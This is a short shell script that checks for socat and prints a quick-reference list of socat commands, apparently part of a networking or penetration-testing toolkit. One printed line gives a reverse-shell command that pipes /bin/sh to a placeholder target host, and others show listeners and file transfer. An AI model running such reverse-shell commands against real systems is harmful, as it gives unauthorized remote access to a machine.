#!/bin/sh
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/../common-script.sh"

ensure_tool socat || exit 1

echo ""
info "=== Socat Quick Reference ==="
info "Listener:          socat TCP-LISTEN:4444,reuseaddr,fork -"
info "Connect:           socat - TCP:target:4444"
info "Port forward:      socat TCP-LISTEN:8080,fork TCP:target:80"
info "SSL listener:      socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork -"
info "Reverse shell:     socat EXEC:/bin/sh TCP:target:4444"
info "File transfer:     socat FILE:file.zip TCP-LISTEN:4444"
echo ""
